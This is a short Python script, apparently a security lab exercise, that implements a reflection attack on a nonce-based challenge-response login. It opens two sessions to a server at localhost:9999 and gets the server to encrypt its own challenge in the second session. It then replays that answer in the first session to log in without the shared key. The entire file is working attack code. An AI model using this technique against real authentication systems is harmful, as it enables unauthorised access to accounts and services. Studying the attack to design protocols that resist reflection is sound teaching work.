from json import dumps, loads
from os import urandom
from socket import socket, AF_INET, SOCK_STREAM


class LoginAttack:
    def __init__(self, server, port):
        """
        Args:
            server (str) - the server address
            port (int) - the server port
        """

        self.server = server
        self.port = port

    def attack(self):
        """Authenticate to a vulnerable server using a reflection attack."""

        sock1 = socket(AF_INET, SOCK_STREAM)
        sock1.connect((self.server, self.port))

        sock2 = socket(AF_INET, SOCK_STREAM)
        sock2.connect((self.server, self.port))

        # Send Message - C -> S: Login, N1 (session 1)
        nonce1 = urandom(16)
        sock1.send(dumps({'type': 'login', 'nonce1': nonce1.hex()}).encode())

        # Receive Message - S -> C: N2, K{N1} (session 1)
        received = loads(sock1.recv(1024))
        nonce2 = bytes.fromhex(received['nonce2'])

        # Send Message - C -> S: Login, N2 (session 2)
        sock2.send(dumps({'type': 'login', 'nonce1': nonce2.hex()}).encode())

        # Receive Message - S -> C: N3, K{N2} (session 2)
        received = loads(sock2.recv(1024))
        enc_nonce2 = received['enc_nonce1']
        sock2.close()

        # Send Message - C -> S: K{N2} (session 1)
        sock1.send(dumps({'enc_nonce2': enc_nonce2}).encode())
        print(f'Response: {sock1.recv(512).decode()}')


if __name__ == '__main__':
    attack = LoginAttack(server='localhost', port=9999)
    attack.attack()
